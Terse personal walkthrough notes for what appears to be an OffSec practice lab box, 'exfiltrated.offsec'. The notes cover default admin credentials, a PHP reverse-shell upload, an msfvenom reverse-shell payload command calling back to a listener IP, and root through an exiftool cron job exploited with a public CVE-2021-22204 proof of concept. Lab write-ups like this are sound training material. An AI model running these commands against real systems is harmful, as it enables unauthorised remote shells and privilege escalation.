ports 22, 80 open
add exfiltrated.offsec to /etc/hosts

looking around, we find a login page, and admin:admin works
we also found an authenticated arbitrary file upload

running the exploit wasnt working, so decided to do it manually
visit the /panel page, login with admin:admin
visit /panel/uploads and somehow upload a php reverse shell
visit exfiltrated.offsec/rshell.php and get the rev shell
manual wasnt working, as read.json wasnt letting me upload anything

so went back to the code, and realized, I was missing a / at the end of my url
we get a not-so-interractive shell
could upgrade 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=4444 -f elf -o shell
```
www-data!

---
we see in /etc/crontab, there a `bash /opt/image-exif.sh`
and in the file, the main command, which allows command injection 
`exiftool "$IMAGES/$filename" >> $LOGFILE` inside /var/www/html/subrion/uploads

we look up exiftool command privilege escalation, and find several poc for command injection, one of which is https://github.com/convisolabs/CVE-2021-22204-exiftool/
`git clone https://github.com/convisolabs/CVE-2021-22204-exiftool/`
just modified the ip and port, `python exploit.py`
It creates an image.jpg, which I transfered to the /var/www/html/subrion/uploads using wget
and got root while listening on 9090
root!